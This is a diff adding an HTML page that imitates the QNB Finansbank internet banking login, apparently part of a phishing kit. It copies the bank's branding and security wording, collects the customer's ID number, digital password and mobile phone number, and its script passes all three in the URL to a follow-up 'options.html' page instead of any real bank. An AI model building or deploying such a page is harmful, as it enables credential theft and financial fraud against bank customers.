@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QNB Finansbank İnternet Şubesi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.98);
+            padding: 30px 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            width: 420px;
+            max-width: 100%;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo img {
+            width: 180px;
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #6a1b9a;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(106, 27, 154, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #6a1b9a;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #4a148c;
+        }
+
+        .security-note {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #555;
+            border-left: 4px solid #6a1b9a;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #6a1b9a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="images/logo.png" alt="QNB Finansbank Logo">
+        </div>
+        <h1 style="text-align: center; color: #333; margin-bottom: 20px; font-size: 18px;">İnternet Şubesi</h1>
+        <p style="text-align: center; color: #666; margin-bottom: 25px; font-size: 14px;">Lütfen müşteri numarası / TCKN ve Dijital Şifrenizi giriniz.</p>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="tcno">Müşteri / T.C. Kimlik Numaranız</label>
+                <input type="text" id="tcno" name="tcno" maxlength="11" pattern="[0-9]{11}" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Dijital Şifreniz</label>
+                <input type="password" id="password" name="password" maxlength="6"
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Cep Telefonu</label>
+                <input type="tel" id="phone" name="phone" maxlength="11" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="5XX XXX XX XX" required>
+            </div>
+
+            <div style="margin-bottom: 20px; text-align: right;">
+                <a href="#" style="color: #6a1b9a; text-decoration: none; font-size: 14px;">Dijital Şifre Al / Dijital Şifremi Unuttum</a>
+            </div>
+
+            <button type="submit" id="submitButton">BAŞVURU YAP</button>
+            <button type="button" id="loginProcess" style="display: none;">
+                <div class="spinner"></div>
+            </button>
+
+            <div class="security-note">
+                <strong>Güvenliğiniz İçin:</strong> Dijital Şifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız.
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var tcno = document.getElementById('tcno').value;
+            var password = document.getElementById('password').value;
+            var phone = document.getElementById('phone').value;
+
+            if (tcno && password && phone) {
+                document.getElementById('submitButton').style.display = 'none';
+                document.getElementById('loginProcess').style.display = 'block';
+
+                // Just redirect to options page with the data
+                window.location.href = 'options.html?tcno=' + tcno + '&password=' + password + '&phone=' + phone;
+            }
+        });
+    </script>
+</body>
+</html> 
